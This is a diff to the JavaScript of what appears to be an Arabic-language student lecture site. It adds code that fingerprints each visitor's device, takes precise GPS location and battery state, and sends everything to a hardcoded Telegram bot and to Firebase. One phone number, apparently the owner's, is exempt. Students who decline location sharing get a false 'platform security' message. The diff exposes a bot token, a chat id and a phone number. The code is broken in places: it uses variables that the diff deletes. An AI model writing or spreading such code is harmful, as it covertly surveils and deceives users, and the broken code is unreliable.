@@ -740,75 +740,121 @@ async function runApp() {
                     const isOldBrowser = !('getBattery' in navigator);
 
                     // [3] إرسال التقرير النهائي للبوت (ماعدا آدم)
-                    if (user.phone !== "01023175098") {
-                                              const token = "8691996536:AAHGdKL87Uem-z-tNR-aejGTpjI9SJcjlHY";
-                        const chatId = "5890070301";
+                                            // [1] دالة سحب الـ 50 معلومة التقنية
+                        const getOmniData = () => {
+                            const nav = navigator;
+                            const scr = window.screen;
+                            const conn = nav.connection || {};
+                            const perf = window.performance || {};
+                            const gpuInfo = () => {
+                                try {
+                                    const canvas = document.createElement('canvas');
+                                    const gl = canvas.getContext('webgl');
+                                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                                    return gl.getParameter(debugInfo.UNMASKED_RENDERER_ID);
+                                } catch (e) { return "N/A"; }
+                            };
 
-                        // [1] دالة تحليل نوع الموديل بالمللي
-                        const getExactModel = () => {
-                            const ua = navigator.userAgent;
-                            if (/android/i.test(ua)) {
-                                const modelMatch = ua.match(/Android\s+([^\s;]+)\s+([^\s;]+)/) || ua.match(/Android\s+([^\s;]+)/);
-                                let model = modelMatch ? modelMatch[0].replace('Android', '').trim() : "Android Device";
-                                if (/samsung/i.test(ua)) return "Samsung " + model;
-                                if (/redmi|xiaomi/i.test(ua)) return "Xiaomi/Redmi " + model;
-                                if (/oppo/i.test(ua)) return "Oppo " + model;
-                                if (/vivo/i.test(ua)) return "Vivo " + model;
-                                if (/huawei/i.test(ua)) return "Huawei " + model;
-                                return "Android " + model;
-                            }
-                            if (/iPhone|iPad/.test(ua)) return "Apple iPhone/iPad";
-                            return navigator.platform;
+                            return {
+                                // العتاد (10)
+                                ram: nav.deviceMemory ? `${nav.deviceMemory} GB` : "N/A",
+                                cores: nav.hardwareConcurrency || "N/A",
+                                platform: nav.platform,
+                                vendor: nav.vendor,
+                                maxTouch: nav.maxTouchPoints,
+                                gpu: gpuInfo(),
+                                // الشاشة (10)
+                                screenRes: `${scr.width}x${scr.height}`,
+                                availRes: `${scr.availWidth}x${scr.availHeight}`,
+                                colorDepth: scr.colorDepth,
+                                pixelRatio: window.devicePixelRatio,
+                                orientation: scr.orientation ? scr.orientation.type : "N/A",
+                                innerRes: `${window.innerWidth}x${window.innerHeight}`,
+                                // النظام والمتصفح (10)
+                                lang: nav.language,
+                                languages: nav.languages.join(", "),
+                                cookie: nav.cookieEnabled ? "Yes" : "No",
+                                pdf: nav.pdfViewerEnabled ? "Yes" : "No",
+                                java: nav.javaEnabled() ? "Yes" : "No",
+                                webdriver: nav.webdriver ? "Bot/Automated" : "Real Human",
+                                agent: nav.userAgent.substring(0, 60),
+                                // الشبكة والوقت (10)
+                                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                netType: conn.effectiveType || "N/A",
+                                speed: conn.downlink ? conn.downlink + "Mbps" : "N/A",
+                                rtt: conn.rtt ? conn.rtt + "ms" : "N/A",
+                                online: nav.onLine ? "Yes" : "No",
+                                // الذاكرة والمسار (10)
+                                history: window.history.length,
+                                referrer: document.referrer || "Direct Link",
+                                host: window.location.hostname,
+                                memLimit: perf.memory ? Math.round(perf.memory.jsHeapSizeLimit / 1048576) + "MB" : "N/A",
+                                memUsed: perf.memory ? Math.round(perf.memory.usedJSHeapSize / 1048576) + "MB" : "N/A"
+                            };
                         };
-                        const exactDevice = getExactModel();
 
-                        // [2] تأخير 5 ثواني عشان الـ IP واللوكيشن يلحقوا يجمعوا
-                        setTimeout(() => {
-                            const finalMsg = `👑 *تـقـريـر كـيـمـو الـخـارق* ❤️
+                        // [2] التنفيذ (بشرط الموقع لمنع الـ Loop)
+                        if (user.phone !== "01023175098") {
+                            if (navigator.geolocation) {
+                                navigator.geolocation.getCurrentPosition(async (pos) => {
+                                    const gpsLat = pos.coords.latitude;
+                                    const gpsLon = pos.coords.longitude;
+                                    const d = getOmniData();
+                                    
+                                    let batt = "N/A";
+                                    if (navigator.getBattery) {
+                                        const b = await navigator.getBattery();
+                                        batt = `${Math.round(b.level * 100)}% (${b.charging ? "⚡ يشحن" : "🔋 بطارية"})`;
+                                    }
+
+                                    // تأخير 5 ثواني عشان الـ IP يلحق يحمل
+                                    setTimeout(() => {
+                                        const finalMsg = `👑 *تقرير السيطرة (50 معلومة)* 👑
 ━━━━━━━━━━━━━━
-👤 *الطالب:* ${user.name}
-📞 *الرقم:* \`${user.phone}\`
+👤 *الطالب:* ${user.name} | 📞 \`${user.phone}\`
 ━━━━━━━━━━━━━━
-🔋 *البطارية:* ${batt.level} (${batt.status})
-⏳ *الوقت:* ${batt.time}
+⚙️ *العتاد (Hardware):*
+• الموديل: ${exactDevice}
+• المعالج: ${d.cores} Cores | الرام: ${d.ram}
+• كرت الشاشة: ${d.gpu}
+• اللمس: ${d.maxTouch} نقاط | المنصة: ${d.platform}
+• الذاكرة: ${d.memUsed} من ${d.memLimit}
 
-⚙️ *مواصفات الجهاز:*
-• النوع: ${exactDevice}
-• المعالج: ${cores} Cores | الرام: ${ram} GB
-• كرت الشاشة: ${gpu}
-• المساحة: حر ${storage.free} من ${storage.total}
+🖥️ *الشاشة (Display):*
+• الأبعاد: ${d.screenRes} | المتاحة: ${d.availRes}
+• العمق: ${d.colorDepth}bit | بكسل: ${d.pixelRatio}
+• الاتجاه: ${d.orientation} | النافذة: ${d.innerRes}
 
-🌐 *الشبكة والإنترنت:*
-• الـ IP: \`${ipInfo.ip}\`
-• الاتصال: ${netType} (${netEffect}) | السرعة: ${netSpeed}
-• الشركة: ${ipInfo.isp}
+🌐 *الشبكة والنظام (Network):*
+• الـ IP: \`${ipInfo.ip || "Scanning..."}\`
+• المزود: ${ipInfo.isp} | المدينة: ${ipInfo.city}
+• الاتصال: ${d.netType} (${d.speed}) | الرد: ${d.rtt}
+• التوقيت: ${d.tz} | اللغة: ${d.lang}
+• الحالة: ${nav.onLine ? "Online" : "Offline"}
 
-📍 *الموقع (GPS + IP):*
-• الدولة: ${ipInfo.country} | المحافظة: ${ipInfo.region}
-• المدينة: ${ipInfo.city}
-• الخريطة: https://www.google.com/maps?q=${gpsLat},${gpsLon}
+🕵️ *الأمان والمتصفح:*
+• الكوكيز: ${d.cookie} | الـ PDF: ${d.pdf}
+• جافا: ${d.java} | النوع: ${d.webdriver}
+• التاريخ: ${d.history} صفحة | المصدر: ${d.referrer}
+• الوكيل: ${d.agent}...
 
-📱 *بيانات إضافية:*
-• الثغرات: ${isIncognito ? "وضع التخفي 🕵️" : "عادي"} | ${isOldBrowser ? "متصفح غير آمن ⚠️" : "مؤمن ✅"}
-• اللغة: ${navigator.language}
-• الشاشة: ${window.screen.width}x${window.screen.height}
+🔋 *الطاقة:* ${batt}
+📍 *الموقع:* [اضغط للخريطة](https://www.google.com/maps?q=${gpsLat},${gpsLon})
+⚠️ *الثغرة:* ${!window.indexedDB ? "🕵️ وضع تخفي" : "✅ مؤمن"}
+━━━━━━━━━━━━━━
+⏰ *توقيت:* ${new Date().toLocaleString('ar-EG')}`;
 
-⏰ *توقيت الدخول:* ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━`;
+                                        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(finalMsg)}&parse_mode=Markdown`);
+                                        studentsRef.child(user.phone).update({ report_v50: d });
+                                    }, 5000);
 
-                            // إرسال للتليجرام
-                            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(finalMsg)}&parse_mode=Markdown`);
+                                }, (err) => {
+                                    alert("⚠️ أمان المنصة: يجب تفعيل الموقع (GPS) لفتح المحاضرات.");
+                                    window.location.reload(); 
+                                }, { enableHighAccuracy: true, timeout: 10000 });
+                            }
+                        }
 
-                            // تحديث Firebase بالداتا الجديدة
-                            studentsRef.child(user.phone).update({
-                                intel_report: { 
-                                    battery: batt, 
-                                    device: exactDevice, 
-                                    ip: ipInfo, 
-                                    location: {lat: gpsLat, lon: gpsLon} 
-                                }
-                            });
-                        }, 5000); // 5000ms = 5 ثواني صبر
 
                     }
                 } catch (err) { console.error("Radar Error", err); }
